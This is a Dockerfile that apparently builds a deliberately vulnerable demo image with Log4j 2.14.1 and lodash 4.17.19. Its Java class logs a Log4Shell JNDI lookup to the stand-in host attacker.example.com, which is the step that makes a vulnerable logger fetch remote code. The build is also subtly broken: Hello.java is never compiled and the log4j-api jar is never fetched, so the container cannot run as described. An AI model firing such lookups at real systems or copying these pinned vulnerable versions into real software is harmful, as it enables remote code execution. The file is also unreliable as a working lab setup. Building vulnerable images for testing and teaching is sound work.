# Dockerfile — vulnerable Log4Shell + lodash

FROM ubuntu:20.04

# 1) Install JDK (for javac), Node.js 14, curl
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive \
      apt-get install -y \
        curl \
        gnupg \
        ca-certificates && \
    curl -fsSL https://deb.nodesource.com/setup_14.x | bash - && \
    DEBIAN_FRONTEND=noninteractive \
      apt-get install -y \
        openjdk-11-jdk-headless \
        nodejs && \
    rm -rf /var/lib/apt/lists/*

# 2) Fetch vulnerable Log4j core (2.14.1)
RUN mkdir -p /vuln/log4j && \
    curl -fsSL \
      -o /vuln/log4j/log4j-core-2.14.1.jar \
      https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar

# 3) Java app with Log4Shell payload (no variable interpolation)
RUN mkdir -p /app/java
COPY --chown=root:root <<'EOF' /app/java/Hello.java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class Hello {
    private static final Logger logger = LogManager.getLogger(Hello.class);
    public static void main(String[] args) {
        // CVE-2021-44228 payload
        logger.error("${jndi:ldap://attacker.example.com/a}");
        System.out.println("Log4j demo complete.");
    }
}
EOF

# 4) Node.js app with lodash 4.17.19 (CVE-2021-23337)
RUN mkdir -p /app/node
WORKDIR /app/node
RUN npm init -y && \
    npm install lodash@4.17.19 && \
    printf "const _ = require('lodash');\nconsole.log(_.pad('Vulnerable Node app!', 30, '*'));\n" > index.js

# 5) JSON‐form CMD must be one valid instruction, not split
EXPOSE 8080
CMD ["sh","-c","echo 'Starting vulnerable Log4j app…' && java -cp /vuln/log4j/log4j-core-2.14.1.jar:/app/java Hello & echo 'Starting vulnerable Node.js app…' && node /app/node/index.js"]
